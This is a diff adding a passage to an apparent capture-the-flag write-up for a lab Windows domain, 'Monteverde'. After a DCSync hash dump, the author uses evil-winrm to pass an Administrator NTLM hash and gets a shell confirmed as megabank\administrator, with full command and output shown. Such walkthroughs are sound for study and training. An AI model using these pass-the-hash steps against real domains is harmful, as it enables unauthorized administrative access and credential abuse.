@@ -428,3 +428,20 @@ MONTEVERDE$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089
 ```
 
 I now have dumped all the hashes from the domain via a DCSync
+
+```python
+evil-winrm -i monteverde.megabank.local -u administrator -H '100a42db8caea588a626d3a9378cd7ea'
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+megabank\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+```
+And once again i am able to get access as the Administrator!
+
